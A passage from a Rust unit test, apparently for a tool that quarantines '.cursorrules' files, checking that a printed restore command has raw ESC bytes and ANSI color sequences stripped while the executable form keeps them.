        let to = PathBuf::from("/repo/.cursorrules");
        let restore_cmd = restore_command(&from, &to);
        // Precondition: the executable form keeps the raw ESC (else vacuous).
        assert!(
            restore_cmd.contains('\u{1b}'),
            "restore_command itself must keep the raw bytes for execution: {restore_cmd:?}"
        );

        // The PRINTED form (what `quarantine` emits) must be sanitized.
        let sanitized_restore_cmd = sanitize_display(&restore_cmd);
        assert!(
            !sanitized_restore_cmd.contains('\u{1b}'),
            "the printed restore hint must contain no raw ESC byte: {sanitized_restore_cmd:?}"
        );
        // The CSI bodies are consumed along with the ESC.
        assert!(
            !sanitized_restore_cmd.contains("[31m") && !sanitized_restore_cmd.contains("[0m"),
            "the CSI bodies must be stripped with the ESC: {sanitized_restore_cmd:?}"
        );
    }
}
